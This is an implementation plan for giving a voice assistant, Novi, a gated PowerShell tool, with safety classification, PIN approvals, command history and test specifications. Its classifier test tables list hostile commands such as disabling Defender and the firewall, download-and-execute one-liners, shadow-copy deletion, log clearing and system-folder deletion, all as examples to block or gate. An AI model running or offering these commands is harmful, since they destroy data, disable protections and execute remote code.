# Laptop Commands Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Novi runs one PowerShell command for requests no tool covers, with look / change / danger / never safety levels and a command history.

**Architecture:** New plugin `plugins/commands`: `classify.js` (pure safety levels), `runner.js` (hidden PowerShell per command, `-EncodedCommand`, parser re-check for look commands), `history.js` (JSON lines). Approvals via `before_tool_call`; danger approvals carry a new `pin: true` flag that `server/remoteTrust.js` turns into a PIN requirement on every device. History in Settings (laptop only) and by voice.

**Tech Stack:** Node ESM, Vitest, Windows PowerShell 5.1 (`System.Management.Automation.Language.Parser`), React.

**Spec:** `docs/superpowers/specs/2026-10-15-novi-laptop-commands-design.md`

## Global Constraints

- Never elevate. One command line per call. Timeout 60 s. Output cut at 4,000 characters; history keeps the first 300.
- Look runs without asking; change asks (spoken purpose, command on the card, `severity: 'warning'`, `category: 'commands'`, `grantable: false`); danger = change + `pin: true`; never = `block`.
- Never-text: "I won't run that: <reason>. Here's the command if you want to run it yourself: <command>"
- All results `sensitive: true`. Not Windows → "Commands work only on Windows."
- History file `data/commands/history.jsonl`, last 500 kept (rewrite when > 600). Route laptop only.

## Review Focus

- A look command hiding a write (`Get-ChildItem | ForEach-Object { Remove-Item $_ }`, `Get-Process > x.txt`, `$(Remove-Item a)`) must not be look (Task 1 tests).
- A "look" the JS checker misses must still be stopped by the PowerShell parser check → asks as a change (Task 2 + Task 5 tests on `NOVI-NOT-LOOK`).
- Danger by voice from the laptop with no PIN set → never runs (Task 3 test).
- A direct voice route must never skip the change/danger question (`ASK_ANYWAY`, Task 5 test).
- A command that prints a password/token: output stays `sensitive` and the history keeps only 300 chars (Task 4/5 tests).

---

### Task 1: safety levels

**Files:** Create `plugins/commands/classify.js`, `plugins/commands/readList.json`; Test `tests/server/commandsClassify.test.js`

**Interfaces:** Produces `classify(command: string) → { level: 'look'|'change'|'danger'|'never', reason: string }`, `READ_COMMANDS: Set<string>` (lower-case names from `readList.json`: cmdlets + programs), `commandWords(command) → string[]` (alias-resolved, lower-case).

- [ ] Step 1: tests — tables per level (spec §B), at least:
  - look: `Get-PSDrive D`, `Get-Volume`, `Get-Process | Sort-Object CPU -Descending | Select-Object -First 5`, `gci $HOME\Downloads | Measure-Object -Property Length -Sum`, `ipconfig`, `Get-NetIPAddress -AddressFamily IPv4`, `Test-Path C:\x`, `systeminfo`, `Get-ChildItem C:\ | Where-Object { $_.Length -gt 1GB }`, `[math]::Round((Get-PSDrive C).Free/1GB,1)`
  - change: `Rename-Item a.txt b.txt`, `gci *.jpeg | Rename-Item -NewName { $_.Name -replace '.jpeg','.jpg' }`, `Stop-Process -Name notepad`, `Move-Item a C:\b`, `New-Item -ItemType Directory x`, `Get-Process > procs.txt`, `Get-ChildItem -Force`, `Set-Content a.txt hi`, `Start-Process notepad`, `[IO.File]::WriteAllText('a','b')`, `Get-Item x; Copy-Item x y`
  - danger: `Remove-Item C:\Users\me\Downloads\temp -Recurse`, `rm a.txt`, `gci *.tmp | % { rm $_ }`, `$(Remove-Item a)`, `Stop-Service spooler`, `reg add HKCU\Software\X /v a /d 1`, `Set-ItemProperty HKLM:\SOFTWARE\X -Name a -Value 1`, `winget install vlc`, `schtasks /create /tn x /tr y`, `Start-Process cmd -Verb RunAs`, `New-LocalUser bob`, `Set-ExecutionPolicy Unrestricted`, `iex 'Get-Date'`, `Invoke-WebRequest u -OutFile f`, `Restart-Computer`
  - never: `Set-MpPreference -DisableRealtimeMonitoring $true`, `Add-MpPreference -ExclusionPath C:\`, `netsh advfirewall set allprofiles state off`, `iex (iwr http://x/a.ps1)`, `irm http://x | iex`, `powershell -enc SQBFAFgA`, `vssadmin delete shadows /all`, `bcdedit /set x`, `Format-Volume -DriveLetter D`, `wevtutil cl System`, `Remove-Item C:\Windows\System32 -Recurse`, `rm -r C:\`, `Remove-Item 'C:\Program Files\X' -Recurse`
  - every result has a non-empty `reason`; `classify('')` → change.
- [ ] Step 2: run `npx vitest run tests/server/commandsClassify.test.js` → FAIL (module missing).
- [ ] Step 3: implement (never checks first on the whole line, then split into command words, then danger, then look). Step 4: run → PASS.
- [ ] Step 5: commit `Commands: safety levels`.

### Task 2: the runner

**Files:** Create `plugins/commands/runner.js`; Test `tests/server/commandsRunner.test.js`

**Interfaces:** Consumes `READ_COMMANDS`. Produces `createRunner({ spawnImpl, platform, home, timeoutMs = 60_000, maxOutput = 4000 }) → { run({ command, look }): Promise<{ ok, exitCode, output, notLook?, timedOut? }> }`; `buildScript(command, look) → string` (look = parser check prefix that prints `NOVI-NOT-LOOK` and `exit 3` if any `CommandAst` name is not in the read list or any `InvokeMemberExpressionAst` is not `[math]`/`[datetime]`/`[Environment]::GetFolderPath`, then the command; the user command is embedded as a single-quoted PowerShell string with `'` doubled, parsed with `ParseInput`, and run with `[ScriptBlock]::Create`).

- [ ] Step 1: tests with a fake spawn: args are `['-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand', b64]` where `Buffer.from(b64,'base64').toString('utf16le') === buildScript(cmd, look)`, `cwd: home`, `windowsHide: true`; exit 0 + stdout → `{ ok: true, exitCode: 0, output }`; exit 1 + stderr → `ok: false` with stderr in output; stdout `NOVI-NOT-LOOK` + exit 3 → `{ notLook: true, ok: false }`; output over 4,000 chars cut with `…(cut)`; no exit within `timeoutMs` → kill called, `{ ok: false, timedOut: true }`; non-win32 → rejects `not-windows` without spawning; `buildScript("Get-Item 'a'", true)` contains `'Get-Item ''a'''` and `ParseInput`, `buildScript(c, false)` contains no `ParseInput`.
- [ ] Step 2: run → FAIL. Step 3: implement. Step 4: run → PASS.
- [ ] Step 5: commit `Commands: runner with a parser check`.

### Task 3: PIN approvals on every device

**Files:** Modify `server/plugins/host.js` (gate copies `req.pin` → `approval.pin = true`), `server/brain/agent.js` (`approvals.decide({... pin})`; `ASK_ANYWAY` adds `laptop_run`), `server/remoteTrust.js` (`requiredProof`: `approval.pin` → `'pin'` for any `from`, laptop included; `createRemoteTrust` verifier `hasPin()`: false → `{ ok: false, need: 'no-pin' }`), `server/app.js` (`NEED_TEXT['no-pin'] = 'Set a voice PIN in Settings first.'`; pass `hasPin` from the PIN store; `needs_proof` for `'local'` reaches laptop pages); Test `tests/server/remoteTrust.test.js`, `tests/server/plugins.test.js`, `tests/server/agent.test.js`

**Interfaces:** Produces approval field `pin: boolean`; trust need `'no-pin'`.

- [ ] Step 1: tests — `requiredProof({ tier: 'medium', pin: true }, 'local')` → `'pin'`; from a phone → `'pin'`; without `pin` from local → null (unchanged); trust with `hasPin: () => false` → `{ ok: false, need: 'no-pin' }` even with a proof; with a correct PIN → ok; host gate keeps `pin: true` from `requireApproval`; agent passes `pin` to `approvals.decide`.
- [ ] Step 2: run → FAIL. Step 3: implement (find the PIN store in `server/remotePin.js` for `hasPin`). Step 4: run → PASS.
- [ ] Step 5: commit `Approvals: voice PIN on every device for pin approvals`.

### Task 4: history

**Files:** Create `plugins/commands/history.js`; Test `tests/server/commandsHistory.test.js`

**Interfaces:** Produces `createHistory({ file, now = () => new Date(), keep = 500, rewriteAt = 600, logger }) → { add(entry), list({ today?, limit? }) → entry[] (newest first), summary(now) → string }`. Entry `{ at, from: 'laptop'|'phone', level, purpose, command, ran, ok, exitCode, output }` (output cut to 300). `summary`: "3 today. Last: a, b, c." / "None today."

- [ ] Step 1: tests — add/list newest first; output cut to 300; 601 adds → file has 500 lines; `today` filter; unwritable file → add logs a warning and doesn't throw; summary texts (purposes lower-cased first letter).
- [ ] Step 2: run → FAIL. Step 3: implement. Step 4: run → PASS. Step 5: commit `Commands: history`.

### Task 5: the plugin

**Files:** Create `plugins/commands/index.js`, `plugins/commands/openclaw.plugin.json`; Test `tests/server/commandsPlugin.test.js`

**Interfaces:** Consumes Tasks 1, 2, 4; approval `pin` (Task 3). Produces `createCommandsPlugin({ runner, history, platform })`; tools `laptop_run { command, purpose }` → `{ level, ok, exitCode, output, note, sensitive: true }` and `commands_history { today?, limit? }` → `{ entries, note }`.

- [ ] Step 1: tests (fake runner + temp history):
  - look → gate `{}`; run called with `look: true`; note "Done." when ok and empty output, else output passed for the AI; history entry `ran: true, level: 'look', from: 'laptop'`.
  - look but runner says `notLook` → result `{ needsApproval: true, error: "That command does more than look, so I'll ask first." }`, gate on the same command afterwards asks as change (the plugin remembers commands that failed the check for 10 min).
  - change → approval `{ title: 'Rename the .jpeg files to .jpg?', detail: <command>, tier: 'medium', category: 'commands', grantable: false }`, no `pin`; danger → same + `pin: true`; never → `block` with the never-text; history logs never as `ran: false`.
  - `from: { deviceId }` → history `from: 'phone'`.
  - failure: exit 1 → note "That didn't work: <first error line>."; timeout → "That took too long, so I stopped it."; not Windows → "Commands work only on Windows."
  - every result `sensitive: true`; output ≤ 4,000 chars.
  - agent: a direct route calling `laptop_run` (change) still asks (`ASK_ANYWAY`).
- [ ] Step 2: run → FAIL. Step 3: implement (gate classifies; execute classifies again and runs with `look` only for look). Step 4: run → PASS.
- [ ] Step 5: commit `Commands: laptop_run and history tools`.

### Task 6: voice, Settings, tool choice

**Files:** Modify `server/brain/controlCommand.js` (`historyCommand(text) → { tool: 'commands_history', args: { today: true } } | null`), `server/brain/agent.js` (route after control: reply = `note`), `server/brain/toolSelect.js` (group `commands`, words from the spec), `server/app.js` (`GET /api/commands/history` laptop only), `src/components/CommandHistory.jsx` + `src/components/SettingsDrawer.jsx` (section "History"); Test `tests/server/controlCommand.test.js`, `tests/server/agent.test.js`, `tests/server/toolSelect.test.js`, `tests/server/app.test.js`

- [ ] Step 1: tests — `historyCommand`: "what commands did you run today", "what commands have you run", "show me the command history", "aaj kaun se commands chalaye" → today; "run a command" → null. Agent: "what commands did you run today" → history note, router not called. toolSelect: "how much space is left on D drive", "which app is using the most memory", "rename all jpeg files to jpg" offer `laptop_run`; "what's the weather" doesn't. App: `/api/commands/history` from loopback → 200 `{ entries }`, from a paired phone → 403.
- [ ] Step 2: run → FAIL. Step 3: implement; Settings section shows time, level chip, laptop/phone, purpose, `<code>` command, ✓/✗, output in `<details><pre>`; phone shows "Open this on the laptop." `npm run build` passes. Step 4: run → PASS.
- [ ] Step 5: commit `Commands: history by voice and in Settings`.

### Task 7: wrap-up

- [ ] Full suite `TZ=Asia/Kolkata npx vitest run` → only the 2 known env failures.
- [ ] `tools/my-commands.json`: "how much space is left on D drive" → `laptop_run`; "what commands did you run today" → direct.
- [ ] CLAUDE.md note; push; draft PR with a live checklist; subscribe.
